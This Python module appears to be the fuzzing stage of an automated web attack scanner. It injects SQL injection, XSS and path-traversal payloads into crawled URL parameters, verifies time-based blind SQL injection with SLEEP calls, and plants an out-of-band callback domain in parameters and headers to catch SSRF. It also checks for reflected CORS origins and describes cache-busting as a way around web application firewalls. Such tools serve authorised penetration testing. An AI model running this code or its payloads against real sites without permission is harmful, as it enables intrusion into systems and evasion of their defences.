import asyncio
import aiohttp
import logging
import re
import time
import hashlib
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from core.ui import print_briefing

console = Console()
log = logging.getLogger("rich")

PAYLOADS = {"SQLi": ["'", "1' OR '1'='1", "';--"], "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=prompt(1)>"], "LFI": ["../../../../../../../../etc/passwd", "../../../../windows/win.ini"]}
CHRONOS_MATRIX = {"Time-Blind SQLi": {"active": "1' OR SLEEP(6)--", "control": "1' OR SLEEP(0)--"}}
DETECTIONS = {"SQLi": re.compile(r'(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL query failed|SQLite/JDBCDriver|SequelizeDatabaseError)', re.I), "XSS": re.compile(r'(<script>alert\(1\)</script>|"><img src=x onerror=prompt\(1\)>)', re.I), "LFI": re.compile(r'(root:x:0:0:|\[extensions\]|boot loader)', re.I)}
SEMANTIC_MAP = {"SQLi": ["id", "user", "uid", "cat", "sort", "page", "num"], "XSS": ["q", "search", "query", "name", "keyword", "msg", "term"], "LFI": ["file", "path", "template", "include", "doc", "folder"], "SSRF": ["url", "uri", "redirect", "next", "domain", "callback", "host", "site"]}

def classify_param(param):
    p = param.lower()
    targets = [vuln for vuln, keywords in SEMANTIC_MAP.items() if any(k in p for k in keywords)]
    return targets if targets else ["SQLi", "XSS"]

async def measure_baseline(client, url):
    try:
        start = time.perf_counter()
        async with client.get(url, timeout=8, ssl=False) as r: await r.read()
        return time.perf_counter() - start
    except Exception: return 9.0

async def fuzz_endpoint(client, url, session_state):
    vulnerabilities = []
    try:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        if not query_params: return []
    except ValueError:
        return []

    url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
    try:
        with open(".oast_payload.txt", "r") as f: base_oast = f.read().strip()
        oast_domain = f"{url_hash}.{base_oast}"
    except:
        oast_domain = f"{url_hash}.oast.fun"
        
    oast_headers = {
        "User-Agent": f"Mozilla/5.0 ({oast_domain})", 
        "X-Forwarded-For": oast_domain, 
        "Referer": f"http://{oast_domain}",
        "Origin": f"https://{oast_domain}"
    }

    try:
        async with client.get(url, headers=oast_headers, timeout=5, ssl=False) as r: 
            # --- CORS MISCONFIGURATION DETECTION ---
            if r.headers.get("Access-Control-Allow-Origin") == f"https://{oast_domain}":
                if r.headers.get("Access-Control-Allow-Credentials") == "true":
                    console.print(f"[red]  ! [CRITICAL] Authenticated CORS Misconfig (Reflects Origin) on {url}[/red]")
                    vulnerabilities.append({"type": "VULN", "name": "Auth CORS Misconfig", "matched-at": url, "info": {"severity": "CRITICAL"}})
                else:
                    console.print(f"[red]  ! [HIGH] CORS Misconfig (Reflects Origin) on {url}[/red]")
                    vulnerabilities.append({"type": "VULN", "name": "CORS Misconfig", "matched-at": url, "info": {"severity": "HIGH"}})
    except Exception: pass

    baseline = await measure_baseline(client, url)

    for param, values in query_params.items():
        target_vulns = classify_param(param)

        if "SSRF" in target_vulns:
            fuzzed_params = query_params.copy()
            fuzzed_params[param] = [f"http://{oast_domain}"]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            try:
                async with client.get(target_url, timeout=5, ssl=False) as r: pass
            except Exception: pass

        for vuln_type in [v for v in target_vulns if v in PAYLOADS]:
            for payload in PAYLOADS[vuln_type]:
                fuzzed_params = query_params.copy()
                fuzzed_params[param] = [payload]
                target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                try:
                    async with client.get(target_url, timeout=5, ssl=False) as r:
                        if DETECTIONS[vuln_type].search(await r.text()):
                            console.print(f"[red]  ! [HIGH] {vuln_type} matched on ?{param}=...[/red]")
                            vulnerabilities.append({"type": "VULN", "name": f"GET {vuln_type}", "matched-at": target_url, "info": {"severity": "HIGH"}})
                            break
                except Exception: pass

        if "SQLi" in target_vulns and baseline <= 4.0:
            for vuln_type, matrix in CHRONOS_MATRIX.items():
                cb_hash = hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
                fuzzed_params = query_params.copy()
                fuzzed_params[param] = [matrix["active"]]
                fuzzed_params["cb"] = [cb_hash]
                
                active_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                active_delay = 0
                try:
                    start = time.perf_counter()
                    async with client.get(active_url, timeout=10, ssl=False) as r: await r.read()
                    active_delay = time.perf_counter() - start
                except asyncio.TimeoutError: active_delay = 10.0
                except Exception: pass

                if active_delay >= 5.5:
                    fuzzed_params[param] = [matrix["control"]]
                    fuzzed_params["cb"] = [hashlib.md5(str(time.time() + 1).encode()).hexdigest()[:6]]
                    
                    control_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                    control_delay = 0
                    try:
                        start = time.perf_counter()
                        async with client.get(control_url, timeout=10, ssl=False) as r: await r.read()
                        control_delay = time.perf_counter() - start
                    except asyncio.TimeoutError: control_delay = 10.0
                    except Exception: pass

                    if control_delay < 3.0:
                        console.print(f"[red]  ! [CRITICAL] {vuln_type} (Double-Blind Verified) on ?{param}=...[/red]")
                        vulnerabilities.append({"type": "VULN", "name": f"Chronos {vuln_type}", "matched-at": active_url, "info": {"severity": "CRITICAL"}})

    return vulnerabilities

async def deploy_fuzzer(session_state, api_targets):
    connector = aiohttp.TCPConnector(limit=20, ssl=False)
    headers = getattr(session_state, 'auth_headers', {})
    cookies = getattr(session_state, 'auth_cookies', {})
    async with aiohttp.ClientSession(connector=connector, headers=headers, cookies=cookies) as client:
        results = await asyncio.gather(*[fuzz_endpoint(client, t, session_state) for t in api_targets])
        for v in results:
            if v: session_state.vulnerabilities.extend(v)

def run_fuzzer(session, config):
    console.print("\n[bold blue]━━ PHASE 5: NATIVE API FUZZER (SEMANTIC ROUTING & OAST) ━━[/bold blue]")
    print_briefing(
        title="Semantic API Fuzzing & Chronos",
        happening="Semantically routing payloads based on parameter names (e.g. ?url= gets SSRF, ?id= gets SQLi). Deploying Chronos Double-Blind Cache-Busting for WAF evasion.",
        fallback="If network latency is too high, Chronos skips temporal SQLi fuzzing to prevent false positives.",
        command="sqlmap -u 'https://target.com/api?id=1' --time-sec=6"
    )
    
    urls = [u['url'] if isinstance(u, dict) else u for u in session.get_crawled_urls()]
    api_targets = set()
    for t in urls:
        try:
            if '?' in t and not re.search(r'\.(css|js|png|jpg|svg|woff2|ico)(\?.*)?$', t, re.I):
                urlparse(t)
                api_targets.add(t)
        except ValueError:
            pass
            
    api_targets = list(api_targets)
    if not api_targets:
        console.print("WARNING  No parameterized endpoints found in State Graph. Skipping Fuzzer.")
        return
        
    console.print(f"INFO     Deploying Semantic Fuzzer against {len(api_targets)} parameterized targets...")
    asyncio.run(deploy_fuzzer(session, api_targets))
